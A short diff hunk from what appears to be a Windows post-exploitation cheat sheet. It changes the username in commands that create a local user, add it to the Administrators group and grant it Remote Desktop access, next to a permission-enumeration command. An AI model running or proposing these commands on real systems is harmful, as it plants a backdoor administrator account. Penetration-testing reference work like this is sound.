@@ -57,9 +57,9 @@ accesschk.exe -uwqs "Authenticated Users" c:*.*
 ```
 ## Add Administrator Account
 ```
-cmd.exe /c net user siren superPassword /add
-cmd.exe /c net localgroup administrators siren /add
-cmd.exe /c net localgroup "Remote Desktop Users" siren /add
+cmd.exe /c net user c1dn3y superPassword /add
+cmd.exe /c net localgroup administrators c1dn3y /add
+cmd.exe /c net localgroup "Remote Desktop Users" c1dn3y /add
 ```
 ## Add a Windows Domain Administrator
 ```
